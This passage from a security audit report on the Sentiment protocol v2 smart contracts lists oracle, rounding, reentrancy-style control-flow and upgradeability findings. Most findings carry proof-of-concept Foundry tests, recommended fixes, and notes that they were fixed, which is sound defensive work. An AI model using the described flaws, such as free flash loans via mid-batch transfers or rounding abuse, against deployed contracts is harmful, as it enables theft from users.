Mitigated in [PR #141](https://github.com/sentimentxyz/protocol-v2/pull/141) by now allowing any deposited to return 0 shares. While this does not completely eliminate any possibility for the attack, the potential for the attacker to gain is significantly reduced, to the point that it is likely safe.

# [M-03] Chainlink feeds can return stale data, especially in the case of Arbitrum Sequencer downtime

When Arbitrum's Sequencer temporarily goes down, Chainlink feeds are not updated at their regular cadence. When the Sequencer restarts, there may be a short period where old price feeds are used, which risks liquidating healthy users or allowing users to perform illegal operations.

Chainlink maintains an [L2 Sequencer Feed](https://docs.chain.link/data-feeds/l2-sequencer-feeds) which can be used to monitor and avoid this risk.

It is also possible for Chainlink fees to be stale for other reasons, and therefore general staleness checks are considered beneficial. Chainlink used to be clear about this, but their advice has become more fuzzy over the years. However, it is still considered best practice to include.

### Recommendation

You can use Chainlink's Arbitrum Sequencer Feed (0xFdB631F5EE196F0ed6FAa767959853A9F217697D) to perform the following check before all oracle calls:

```solidity
function _checkSequencerFeed() private view {
    (,, int256 answer, uint256 startedAt,,) = sequencerFeed.latestRoundData();

    // Answer == 0: Sequencer is up
    // Answer == 1: Sequencer is down
    if (answer != 0) {
        revert SequencerDown();
    }

    if (block.timestamp - startedAt <= SEQ_GRACE_PERIOD) {
        revert GracePeriodNotOver();
    }
}
```

Additionally, staleness checks can be added to the data feeds themselves as follows:

```diff
function getValueInEth(address asset, uint256 amt) external view returns (uint256) {
+   _checkSequencerFeed()

-   (, int256 price,,,) = IAggegregatorV3(priceFeedFor[asset]).latestRoundData();
+   (, int256 price,, uint256 updatedAt,) = IAggegregatorV3(priceFeedFor[asset]).latestRoundData();

+   if (block.timestamp - updatedAt >= FEED_GRACE_PERIOD) {
+       revert StaleFeed();
+   }

    return amt.mulDiv(uint256(price), (10 ** IERC20Metadata(asset).decimals()));
}
```

### Review

Fixed as recommended in [PR #142](https://github.com/sentimentxyz/protocol-v2/pull/142).

# [L-01] Users can regain control flow while their positions are unhealthy

Users can batch multiple actions for their position through the `processBatch()` function, which, importantly, only checks for the health of the position at the end of the full batch:
```solidity
function processBatch(address position, Action[] calldata actions) external nonReentrant {
    // loop over actions and process them sequentially based on operation
    for (uint256 i; i < actions.length; ++i) {
        _process(position, actions[i]);
    }
    // after all the actions are processed, the position should be within risk thresholds
    if (!riskEngine.isPositionHealthy(position)) revert Errors.HealthCheckFailed();
}
```
This allows positions to take actions that might force the account to be temporarily unhealthy, as long as they get back into health by the end of the batch of actions.

Additionally, the `transfer()` function allows an unsafe external call to be made to any address, which allows a user to take control flow in the middle of a batch of actions:

```solidity
// in PositionManager.sol
function transfer(address position, bytes calldata data) internal {
    // recipient -> address that will receive the transferred tokens
    // asset -> address of token to be transferred
    // amt -> amount of asset to be transferred
    (address recipient, address asset, uint256 amt) = abi.decode(data, (address, address, uint256));

    IPosition(position).transfer(recipient, asset, amt);

    emit Transfer(position, msg.sender, recipient, asset, amt);
}
```
```solidity
// in BasePosition.sol
function transfer(address to, address asset, uint256 amt) external onlyPositionManager {
    // handle tokens with non-standard return values using safeTransfer
    IERC20(asset).safeTransfer(to, amt);
}
```

The result is that the user can gain control flow in the midst of a transaction while manipulating the state of the protocol in any way that they wish.

This has a few implications we should consider:

1) Users are able to take free flash loans from the protocol. They can borrow unlimited assets from a pool, transfer the assets out of the protocol to their personal wallet, use `transfer()` to regain control flow, and then repay the assets at the end of the transaction.

2) Interacting protocols that rely on the state of Sentiment can easily be tricked into trusting incorrect data.

While neither of these implications creates a direct risk to Sentiment, it is worth considering how to reduce the risks they open up.

### Recommendation

If these risks feel like major problems, they could be solved by either (a) checking the health of the position between each action or (b) only allowing `transfer()` to be called with approved assets.

Alternatively, if we are not worried about these risks, I would recommend adding an external view function that calls `_reentrancyGuardEntered()` to return whether we are mid transaction. Documentation can make clear to interacting protocols that they should not trust data from the protocol unless this function returns `false`.

### Review

Fixed in [PR #139](https://github.com/sentimentxyz/protocol-v2/pull/139) by only allowing transfers of known assets.

# [L-02] Withdrawing max from SuperPool can fail due to fees & share rounding

When withdrawing from a SuperPool, we perform two separate withdrawals. First, we withdraw the protocol fee to the owner, and then we withdraw the remaining assets to the user.
```solidity
function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256) {
    // compute fee amount for given assets
    uint256 fee = protocolFee.mulDiv(assets, 1e18);

    // erc4626 return val for fee withdrawal
    uint256 feeShares = ERC4626Upgradeable.withdraw(fee, OwnableUpgradeable.owner(), owner);

    // erc4626 return val for receiver shares withdrawal
    uint256 recieverShares = ERC4626Upgradeable.withdraw(assets - fee, receiver, owner);

    // final return value must comply with erc4626 spec
    return feeShares + recieverShares;
}
```
However, because we round the number of shares to burn in a withdrawal up, splitting a withdrawal into two separate transactions can result in too many shares being burned, and the function reverting.

### Proof of Concept

Let's illustrate a simple example and follow along with the math.

1) A user deposits 51 tokens into a pool, getting 51 shares.
2) Over time, the pool earns 50 wei of interest, bringing the total assets to 101.
3) When we calculate `maxWithdrawal()` for an account, we do `shares * (total assets + 1) / (total shares + 1)`. In this case, that results in `51 * 102 / 52 = 100` assets that can be withdrawn. If they are withdrawn directly, this is correct.
4) Let's suppose a protocol fee of 75%. This will result in trying to withdraw 75 assets for the owner and 25 for the user.
5) How many shares will be burned in the first withdrawal? We want 75 wei of assets, so we will burn `75 * 52 / 102 = 39` (because we round up).
6) How about for the user? We want 25 wei of assets, so we will burn `25 * (52 - 39) / (102 - 75) = 13` (because we round up).

This implies that we will be `39 + 13 = 52` shares, but as we can see, we only started with `51` shares, so it will revert.

The following code can be added to `SuperPool.t.sol` to illustrate this example:
```solidity
function testZach_WithdrawAllCanFail() public {
    address pool = _deployMockPool();
    _setPoolCap(pool, 1e18);
    superPool.setProtocolFee(0.75e18);

    // deposit into the superpool
    uint deposit = 51;
    mockToken.mint(address(this), deposit);
    mockToken.approve(address(superPool), deposit);
    superPool.deposit(deposit, address(this));

    // simulate interest earned
    uint interestAccrued = 50;
    mockToken.mint(address(superPool), interestAccrued);

    // withdraw max will fail due to rounding
    uint maxWithdrawal = superPool.maxWithdraw(address(this));
    vm.expectRevert(abi.encodeWithSignature("ERC4626ExceededMaxWithdraw(address,uint256,uint256)", 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 25, 24));
    superPool.withdraw(maxWithdrawal, address(this), address(this));
}
```

### Recommendation

After performing the first withdrawal, use the returned `shares` value to calculate the remaining shares, and call `redeem()` with that value, rather than using the

```diff
function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256) {
    // compute fee amount for given assets
    uint256 fee = protocolFee.mulDiv(assets, 1e18);
+   uint totalSharesToBurn = previewWithdraw(assets);

    // erc4626 return val for fee withdrawal
    uint256 feeShares = ERC4626Upgradeable.withdraw(fee, OwnableUpgradeable.owner(), owner);

    // erc4626 return val for receiver shares withdrawal
-   uint256 recieverShares = ERC4626Upgradeable.withdraw(assets - fee, receiver, owner);
+   ERC4626Upgradeable.redeem(totalSharesToBurn - feeShares, receiver, owner);

    // final return value must comply with erc4626 spec
-   return feeShares + recieverShares;
+   return totalSharesToBurn;
}
```

You can also add the following fuzz test (which currently passes) to your test suite to ensure this always holds:
```solidity
function testZachFuzz_WithdrawAllSucceeds(uint deposit, uint interestAccrued, uint fee) public {
    address pool = _deployMockPool();
    _setPoolCap(pool, 1e18);
    fee = bound(fee, 0, 1e18);
    superPool.setProtocolFee(fee);

    // deposit into the superpool
    deposit = bound(deposit, 0, 10e18);
    mockToken.mint(address(this), deposit);
    mockToken.approve(address(superPool), deposit);
    superPool.deposit(deposit, address(this));

    // simulate interest earned
    interestAccrued = bound(interestAccrued, 0, 1e18);
    mockToken.mint(address(superPool), interestAccrued);

    // withdraw max succeeds even with rounding
    uint maxWithdrawal = superPool.maxWithdraw(address(this));
    superPool.withdraw(maxWithdrawal, address(this), address(this));
}
```

### Review

Fixed in [PR #120](https://github.com/sentimentxyz/protocol-v2/pull/128) by refactoring SuperPool withdrawals.

# [L-03] Repayment rounds shares up, pushing excess debt onto other users

When `repay()` is called on a pool, we pass the `amount` of borrowed tokens to repay as an argument, and convert it to shares using the `convertAssetToBorrowShares()` function.

However, this function rounds up, which makes the user pay back more shares than the exact value of the assets they are paying off. Note that this is the opposite behavior of the underlying ERC4626 vault, which always rounds in favor of the vault.

```solidity
function convertAssetToBorrowShares(uint256 amt) public view returns (uint256) {
    // borrow shares = amt * totalBorrowShares / currentTotalBorrows
    // handle edge case for when borrows are zero by minting shares in 1:1 amt
    return totalBorrowShares == 0 ? amt : amt.mulDiv(totalBorrowShares, getTotalBorrows(), Math.Rounding.Ceil);
}
```

This impact is negligible when the amount of interest accrued is low (ie when `getTotalBorrows()` and `totalBorrowShares` are close) but as time goes on and the values drift apart, it becomes more significant.

After shares are paid off at a discount, the excess money owed is amortized across other users, increasing their borrow balance owed independent of interest being accrued.

### Proof of Concept

The following test can be dropped into `SdpBorrowTest.t.sol`. It consists of two users who deposit funds into a position and borrow tokens. After time has passed, the first user repays their loan. Because of rounding issues, the result is that the user underpays, while the other user's debt balance doubles.

Note that the `_deployPool()` function must be edited to use a rate other than 0 for this simulation to work. In this case, I used 1e18.

```solidity
function testZach_RepayRoundsUp() public {
    // start the pool with sufficient tokens to borrow
    erc20Borrow.mint(address(this), 1e18);
    erc20Borrow.approve(address(pool), type(uint256).max);
    pool.deposit(1e18, address(this));

    // set up our primary user
    address user1 = makeAddr("user1");
    erc20Collat.mint(user1, 1e18);
    erc20Borrow.mint(user1, 1e18); // have extra funds to pay interest
    address user1PosAddr = _createPositionDepositAndBorrow(user1, 1e18, 1, bytes32("User1SingleDebtPosition"));

    // borrow from another user so we end up with rounding in calculations
    vm.warp(block.timestamp + 26 weeks);
    address user2 = makeAddr("user2");
    erc20Collat.mint(user2, 1e18);
    erc20Borrow.mint(user2, 1e18);
    address user2PosAddr = _createPositionDepositAndBorrow(user2, 1e18, 1, bytes32("User2SingleDebtPosition"));

    vm.warp(block.timestamp + 26 weeks);
    uint u1Before = pool.getBorrowsOf(address(user1PosAddr));
    uint u2Before = pool.getBorrowsOf(address(user2PosAddr));
    console2.log("User 1 Before: ", u1Before);
    console2.log("User 2 Before: ", u2Before);

    bytes memory data = abi.encode(address(pool), 1);
    Action memory repayAction = Action({op: Operation.Repay, data: data});
    vm.prank(user1);
    positionManager.process(address(user1PosAddr), repayAction);

    uint u1After = pool.getBorrowsOf(address(user1PosAddr));
    uint u2After = pool.getBorrowsOf(address(user2PosAddr));
    console2.log("User 1 Before: ", u1After);
    console2.log("User 2 Before: ", u2After);
}

function _createPositionDepositAndBorrow(address user, uint depAmt, uint borrowAmt, bytes32 salt) internal returns (address) {
    vm.startPrank(user);
    erc20Collat.approve(address(positionManager), type(uint256).max);
    erc20Borrow.approve(address(positionManager), type(uint256).max);

    address positionAddr = portfolioLens.predictAddress(0x1, salt);
    bytes memory newPosdata = abi.encode(user, 0x1, salt);
    Action memory newPosAction = Action({op: Operation.NewPosition, data: newPosdata});

    bytes memory depositData = abi.encode(user, address(erc20Collat), depAmt);
    Action memory depositAction = Action({op: Operation.Deposit, data: depositData});

    bytes memory borrowData = abi.encode(address(pool), borrowAmt);
    Action memory borrowAction = Action({op: Operation.Borrow, data: borrowData});

    bytes memory depositBorrowData = abi.encode(user, address(erc20Borrow), depAmt);
    Action memory depositBorrowAction = Action({op: Operation.Deposit, data: depositBorrowData});

    Action memory addAssetAction = Action({op: Operation.AddAsset, data: abi.encode(address(erc20Collat))});
    Action memory addBorrowAssetAction = Action({op: Operation.AddAsset, data: abi.encode(address(erc20Borrow))});

    Action[] memory actions = new Action[](6);
    actions[0] = newPosAction;
    actions[1] = depositAction;
    actions[2] = borrowAction;
    actions[3] = depositBorrowAction;
    actions[4] = addAssetAction;
    actions[5] = addBorrowAssetAction;

    positionManager.processBatch(positionAddr, actions);
    vm.stopPrank();

    return positionAddr;
}
```
```
Logs:
  User 1 Before:  2
  User 2 Before:  2
  User 1 Before:  0
  User 2 Before:  4
```

Of course, the swings are only so extreme because the borrow amounts are unrealistically low. It is helpful as a simulation.

### Recommendation

Option 1: Do repayments in `shares` rather than `assets`, so that the natural rounding down works in the direction of the vault as intended.

Option 2: Manually edit the `repay()` function to round the result up instead of down.

### Review

Fixed in [PR #144](https://github.com/sentimentxyz/protocol-v2/pull/144) by explicitly defining the rounding direction in all math functions, and requiring that this function rounds up.

# [L-04] `convertAssetToBorrowShares` performs incorrect check

In the pool's `convertAssetToBorrowShares()` function, we multiply the amount of assets by `total shares / total borrows` to get the number of shares that should be allocated.

```solidity
function convertAssetToBorrowShares(uint256 amt) public view returns (uint256) {
    // borrow shares = amt * totalBorrowShares / currentTotalBorrows
    // handle edge case for when borrows are zero by minting shares in 1:1 amt
    return totalBorrowShares == 0 ? amt : amt.mulDiv(totalBorrowShares, getTotalBorrows(), Math.Rounding.Ceil);
}
```
As we can see, there is a check beforehand that if `totalBorrowShares == 0`, we just mint at a 1:1 ratio. This check is copied from the conversion in the other direction.
```solidity
function convertBorrowSharesToAsset(uint256 amt) internal view returns (uint256) {
    // notional asset amount = borrowSharesAmt * currenTotalBorrows / totalBorrowShares
    // handle edge case for when borrows are zero by minting shares in 1:1 amt
    return totalBorrowShares == 0 ? amt : amt.mulDiv(getTotalBorrows(), totalBorrowShares, Math.Rounding.Floor);
}
```
However, the goal of such a check is to avoid a divide by zero revert. This is accomplished in the `convertBorrowSharesToAsset()` function because `totalBorrowShares` is the denominator, but is not accomplished in the `convertAssetToBorrowShares()` function because it's the numerator.

Currently, it does not appear to be possible for a pool to end up in a situation where `getTotalBorrows() == 0` while `totalBorrowShares > 0`, but as rounding directions are changed (based on other submitted issues), such a possibility may emerge.

In such a situation, it would be possible to DOS all borrows and repayments to a pool by creating such a situation, which would result in an EVM revert on all conversions.

### Recommendation

```diff
function convertAssetToBorrowShares(uint256 amt) public view returns (uint256) {
    // borrow shares = amt * totalBorrowShares / currentTotalBorrows
    // handle edge case for when borrows are zero by minting shares in 1:1 amt
+   uint totalBorrows = getTotalBorrows();
-   return totalBorrowShares == 0 ? amt : amt.mulDiv(totalBorrowShares, getTotalBorrows(), Math.Rounding.Ceil);
+   return totalBorrows == 0 ? amt : amt.mulDiv(totalBorrowShares, totalBorrows, Math.Rounding.Ceil);
}
```

### Review

Fixed as recommended in [PR #140](https://github.com/sentimentxyz/protocol-v2/pull/140).

# [L-05] Loss of precision in `getSuperPoolInterestRate()`

In order to get the overall SuperPool interest rate, we iterate over the pools, getting the weighted value of each interest rate, and divide the result by `totalAssets`.

```solidity
uint256 weightedAssets;
address[] memory pools = superPool.pools();
for (uint256 i; i < pools.length; ++i) {
    uint256 assets = IERC4626(pools[i]).previewRedeem(IERC20(asset).balanceOf(_superPool));
    weightedAssets += assets.mulDiv(getPoolInterestRate(pools[i]), 1e18);
}

return weightedAssets.mulDiv(1e18, totalAssets);
```
The implementation above divides each weighted value by `1e18` and then multiplies the final result by `1e18 before dividing.

This unnecessary division early on leads to an unnecessary loss of precision.

### Recommendation

```diff
uint256 weightedAssets;
address[] memory pools = superPool.pools();
for (uint256 i; i < pools.length; ++i) {
    uint256 assets = IERC4626(pools[i]).previewRedeem(IERC20(asset).balanceOf(_superPool));
-   weightedAssets += assets.mulDiv(getPoolInterestRate(pools[i]), 1e18);
+   weightedAssets += assets * getPoolInterestRate(pools[i]);
}

- return weightedAssets.mulDiv(1e18, totalAssets);
+ return weightedAssets / totalAssets;
```

### Review

Fixed as recommended in [PR #126](https://github.com/sentimentxyz/protocol-v2/pull/126).

# [L-06] `SuperPool` can have share price manipulated by owner removing pool caps

Share prices in ERC4626 vaults are calculated as:

```solidity
function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
    return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
}
```
In the case of the SuperPool, this simplifies as `assets * (shares + 1) / (assets + 1)`.

If we look at the implementation for `totalAssets()`, we can see that it only counts assets in pools with a `poolCap` set. In the event that a `poolCap` is set to `0`, the pool is removed from the IterableMap and isn't included in the calculation.

```solidity
function totalAssets() public view override returns (uint256) {
    // fetch number of pools
    uint256 len = poolCaps.length();

    // compute total assets managed by superpool across associated pools
    uint256 total;
    for (uint256 i; i < len; i++) {
        // fetch pool by id
        IERC4626 pool = IERC4626(poolCaps.getByIdx(i));

        // fetch assets owned by superpool in the pool
        total += pool.previewRedeem(pool.balanceOf(address(this)));
    }

    // fetch idle assets held in superpool
    total += IERC20(asset()).balanceOf(address(this));

    return total;
}
```

The result is that, if a pool's cap is set to `0`, the price of the SuperPool shares will decrease dramatically, even though the assets accessible to it will remain the same. This could happen by accident, or in the case of a malicious owner, intentionally to mint inexpensive shares.

### Recommendation

The owner must take care to ensure that pool caps are only set to 0 after all assets are removed. Users should understand that the SuperPool's owner role is trusted.

### Review

[PR #127](https://github.com/sentimentxyz/protocol-v2/pull/127) adds a dev comment to the `setPoolCap()` function to make clear that setting a pool cap to 0 should only happen after all assets are removed.

# [L-07] Debt pools can remain stuck in position after liquidation

When a position is being liquidated, we perform the following loop to repay each of the debts being paid off and update the pools accordingly:

```solidity
for (uint256 i; i < debt.length; ++i) {
    // transfer debt asset from the liquidator to the pool
    IERC20(debt[i].asset).transferFrom(msg.sender, debt[i].pool, debt[i].amt);

    // trigger pool repayment which assumes successful transfer of repaid assets
    Pool(debt[i].pool).repay(position, debt[i].amt);
}
```
Comparing this to the usual `repay()` function, we can see that it skips the call to `position.repay()`, which performs the following:
```solidity
function repay(address pool, uint256 amt) external override onlyPositionManager {
    if (Pool(pool).getBorrowsOf(address(this)) == amt) debtPools.remove(pool);
    IERC20(Pool(pool).asset()).safeTransfer(pool, amt);
}
```
The main purpose of this function is to transfer the assets, which is done separately in the liquidation loop. However, in the event that a debt pool is being paid off in full, `repay()` usually removes it, whereas `liquidate()` doesn't.

There does not appear to be a harm in having an extra debt pool with no borrows. However, it is unexpected protocol behavior (there is no other way to reach this state) and could have consequences (as an example, having a single debt pool with zero debt makes the risk engine return a `0` value for total assets, regardless of real collateral).

Note that this cannot be removed by calling `position.repay(0)` because we don't allow repays of zero shares. Therefore, the only way to remove it would be to add more assets and remove them again.

### Recommendation

Add a similar check to `liquidate()` as exists in `repay()`: if the full balance of a debt pool is being paid off, remove it from the position. This will require a permissioned function on the position that only `PositionManager` can call to perform this update.

### Review

Fixed in [PR #117](https://github.com/sentimentxyz/protocol-v2/pull/132) by refactoring the repayment flow to have symmetry with the borrow flow.

# [L-08] Transferring pool ownership does not update PoolFactory mapping

When a new pool is deployed, PoolFactory maintains a mapping from pool to manager:

```solidity
function deployPool(PoolDeployParams calldata params) external whenNotPaused returns (address) {
    ...

    // transfer pool owner to pool manager - msg.sender
    pool.transferOwnership(msg.sender);

    // store pool manager for given pool
    managerFor[address(pool)] = msg.sender;

    ...
}
```

However, if `pool.transferOwnership()` is later called to transfer ownership of the pool, this mapping is never updated, as the native OpenZeppelin implementation is used:
```solidity
function _transferOwnership(address newOwner) internal virtual {
    OwnableStorage storage $ = _getOwnableStorage();
    address oldOwner = $._owner;
    $._owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
}
```

As a result, the public mapping will be incorrect for any pools that have transferred ownership.

### Proof of Concept

The following test can be dropped into `PoolFactory.t.sol` to demonstrate the issue:

```solidity
function testZach_managerNotUpdated() public {
        // deploy a test pool
        Pool pool = Pool(poolFactory.deployPool(PoolDeployParams({
            asset: address(0),
            rateModel: address(0),
            poolCap: 0,
            originationFee: 0,
            name: "test",
            symbol: "test"
        })));

        // manager on the factory is correct
        assert(poolFactory.managerFor(address(pool)) == pool.owner());

        // after transferring ownership, factory isn't updated
        pool.transferOwnership(address(1));
        assert(poolFactory.managerFor(address(pool)) != pool.owner());
    }
```

### Recommendation

It appears this mapping was a "nice to have" that isn't essential. It can be replaced with a boolean or a `deployerOf` mapping that makes clear that it only tracks the deployer and not the current owner.

If it is important to have the current owner listed on the Pool Factory, the pool's `_transferOwnership()` function can be edited to include a call back to the factory to update this value.

### Review

Fixed in [PR #104](https://github.com/sentimentxyz/protocol-v2/pull/107) by renaming the mapping to `deployerOf`.

# [L-09] Protocol often rounds in favor of caller

It is generally advised to round in favor of the protocol, rather than the caller, to avoid potential risks from extrapolating the rounding benefits to the caller's advantage.

This is generally done in the pools and most of the protocol, but there are a few examples where it is done incorrectly.

1) `pool.getBorrowsOf()` is used to determine a user's total debt amount in the Risk Engine (among other things). It should therefore round UP to ensure debt isn't understated. However, it rounds DOWN.

2) `assetsSeizedInEth` is calculated in the `isValidLiquidation()` function to ensure the liquidator isn't seizing more assets than they should. It iterates over each debt pool, summing the weighted average of the asset by each pool's oracle. Each of these proportions should round UP to ensure we have a hard cap on the amount seized. Instead, they round DOWN.

3) `totalBalanceInWei` is the value used to determine if a user's position is sufficiently collateralized. In SingleAssetRiskModule, it is calculated by summing the weighted average of the value provided by each debt pool. Each of these debt pool proportions should be rounded DOWN to ensure the total balance isn't overstated, but instead they round UP.

### Recommendation

Analyze all rounding in the protocol and ensure each calculation rounds in favor of the protocol.

### Review

Fixed in [PR #144](https://github.com/sentimentxyz/protocol-v2/pull/144) by explicitly defining the rounding direction in all math functions.

# [I-01] Inconsistent behavior for view functions on risk modules

Because risk modules calculate the value of collateral assets based on weighting each pool-specific oracle, there is an assumption that debt pools will always exist when these functions are called. While this is handled properly for all in-protocol calls, it leads the external view functions can act in unexpected ways.

Here are a few examples:

1) The `getRiskData()` view function assumes that SingleAssetPositions have a `positionAsset` set, and SingleDebtPositions have a `debtPool` set. It indexes the 0th element of each respective array, and will revert on out of bounds error in the case when they are not set.

2) When SingleDebtPositions have `getTotalAssetValue()` called on them and there is no debt position set, they will similarly revert due to an out of bound errors. Alternately, when SingleAssetPositions have `getTotalAssetValue()` called on them and there is no debt position set, the loop in `getAssetValue()` is not used and we end up with an asset value of `0`.

Note that this list is not exhaustive, and it's not clear the best way to handle this given that assets cannot have specific values returned without a corresponding debt pool whose oracle to use. The purpose of this issue is to raise awareness of the general issue, so we can discuss a more global solution.

### Recommendation

Ensure that these functions behave consistently in terms of when they revert and when they return 0.

### Review

Fixed in [PR #145](https://github.com/sentimentxyz/protocol-v2/pull/145) by ensuring that (a) it will never revert due to unset debt or assets, (b) if there are assets and no debt, everything will return 0 and (c) if there are debt and no assets, the values will be reflected correctly.

# [I-02] `poolCap` can be exceeded with accrued interest

Because `poolCap` is set in `assets` rather than `shares`, it can be surpassed as interest accrues to the borrows.

The intention is that `totalAssets()` will always be less than `poolCap`, which is enforced in the `maxDeposit()` function:
```solidity
function maxDeposit(address) public view override returns (uint256) {
    return poolCap - totalAssets();
}
```
But if we deposit the maximum amount and wait, we end up in a situation where `totalAssets() > poolCap`.

As a result, calls to `maxDeposit` will revert due to underflow.

This does not change any important protocol behavior (because we do not want to allow deposits in this situation), but there are two minor implications:

1) Interacting protocols that call the `maxDeposit()` view function will revert and may break important functionality.

2) Users that attempt to deposit will get an unknown underflow error instead of the defined error message related to depositing more than the cap.

[Note that a slightly different version of the same situation exists in SuperPool.sol, with even less significant consequences.]

### Recommendation

One option would be to define the `poolCap` in terms of shares, which don't rebase and therefore don't have this issue.

Alternatively, we could simply handle the situation where `totalAssets() > poolCap` more gracefully:

```diff
function maxDeposit(address) public view override returns (uint256) {
+   if (totalAssets() >= poolCap) return 0;
    return poolCap - totalAssets();
}
```

### Review

Fixed in [PR #114](https://github.com/sentimentxyz/protocol-v2/pull/114) by returning 0 in the event that `poolCap < assets`.

# [I-03] Inherited upgradeable contracts should provide extra storage slots

Many of the contracts in the protocol are upgradeable, meaning their implementations may be changed at a future date while continuing to use the same proxy contract.

In the case that an upgradeable contract inherits from another contract, it is best practice to leave a storage gap in the inherited contract so that future versions.

According to the [OpenZeppelin docs](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#storage-gaps):

> Storage gaps are a convention for reserving storage slots in a base contract, allowing future versions of that contract to use up those slots without affecting the storage layout of child contracts.

This is specifically an issue in `BasePosition.sol`. Because the position implementation contracts may be updated in the future, any storage slots that we wish to define on BasePosition in those upgrades would break the current storage layouts and cause the proxies to have mismatched storage slots.

### Recommendation

A storage gap should be added to the `BasePosition.sol` contract to ensure there is some buffer for any storage we wish to add to it in future upgrades:
```diff
  /*//////////////////////////////////////////////////////////////
                              Storage
  //////////////////////////////////////////////////////////////*/

  // position manager associated with this position
  address public immutable positionManager;

+ uint256[50] __gap;
```

### Review

Fixed as recommended in [PR #122](https://github.com/sentimentxyz/protocol-v2/pull/122).

# [I-04] `predictAddress` would benefit from `available` bool

`PortfolioLens.predictAddress()` is used to determine the predicted address for a new position, which must be inputted into the call to the Position Manager in order to create the new position.

```solidity
function predictAddress(uint256 positionType, bytes32 salt) external view returns (address) {
    bytes memory creationCode =
        abi.encodePacked(type(BeaconProxy).creationCode, abi.encode(POSITION_MANAGER.beaconFor(positionType), ""));

    return address(
        uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), POSITION_MANAGER, salt, keccak256(creationCode)))))
    );
}
```
Since all the factors that determine the address are hardcoded except the salt, anyone can deploy to the same address.

For users trying to determine which salts lead to available addresses, or , it would be helpful if the `predictAddress()` function also returned a bool representing whether the address is available or not.

### Recommendation

```diff
- function predictAddress(uint256 positionType, bytes32 salt) external view returns (address) {
+ function predictAddress(uint256 positionType, bytes32 salt) external view returns (address, bool) {
      bytes memory creationCode =
          abi.encodePacked(type(BeaconProxy).creationCode, abi.encode(POSITION_MANAGER.beaconFor(positionType), ""));

-     return address(
+     address predictedAddress = address(
          uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), POSITION_MANAGER, salt, keccak256(creationCode)))))
      );

+    return (predictedAddress, predictedAddress.code.length == 0);
}
```

### Review

Fixed as recommended in [PR #136](https://github.com/sentimentxyz/protocol-v2/pull/136).

# [G-01] Some oracle calls in SingleDebtRiskModule's `isValidLiquidation()` can be skipped

When liquidating a SingleDebtPosition, part of our check is to ensure that the `debtInWei` (amount being repaid) is less than the maximum amount we can repay, which is defined by `totalDebtInWei * closeFactor / 1e18`.

```solidity
uint256 debtInWei = getDebtValue(debt[0].pool, debt[0].asset, debt[0].amt);
uint256 totalDebtInWei = getDebtValue(debt[0].pool, debt[0].asset, Pool(debt[0].pool).getBorrowsOf(position));

if (debtInWei > totalDebtInWei.mulDiv(riskEngine.closeFactor(), 1e18)) revert Errors.RepaidTooMuchDebt();
```
As we can see, we call `getDebtValue()` twice with the same `pool` and `asset` values, the only difference being the `amt` that is passed.

This function simply calls the oracle:
```solidity
function getDebtValue(address pool, address asset, uint256 amt) public view returns (uint256) {
    return IOracle(riskEngine.oracleFor(pool, asset)).getValueInEth(asset, amt);
}
```

The oracle simply returns the price time the amount, adjusted for decimals:
```solidity
function getValueInEth(address asset, uint256 amt) external view returns (uint256) {
    (, int256 price,,,) = IAggegregatorV3(priceFeedFor[asset]).latestRoundData();
    return amt.mulDiv(uint256(price), (10 ** IERC20Metadata(asset).decimals()));
}
```
Since all we're interested in is the proportion of the two values, multiplying them by the same price and dividing them by the same decimals will not change the result.

Consequently, we can just compare the amounts directly and save two oracle calls.

### Recommendation

```diff
- uint256 debtInWei = getDebtValue(debt[0].pool, debt[0].asset, debt[0].amt);
+ uint256 debtAmount = debt[0].amt;
- uint256 totalDebtInWei = getDebtValue(debt[0].pool, debt[0].asset, Pool(debt[0].pool).getBorrowsOf(position));
+ uint256 totalDebtAmount = Pool(debt[0].pool).getBorrowsOf(position));

- if (debtInWei > totalDebtInWei.mulDiv(riskEngine.closeFactor(), 1e18)) revert Errors.RepaidTooMuchDebt();
+ if (debtAmount > totalDebtAmount.mulDiv(riskEngine.closeFactor(), 1e18)) revert Errors.RepaidTooMuchDebt();
```

### Review

Fixed via [PR #110](https://github.com/sentimentxyz/protocol-v2/pull/143) because removing the `closeFactor` removed these checks entirely.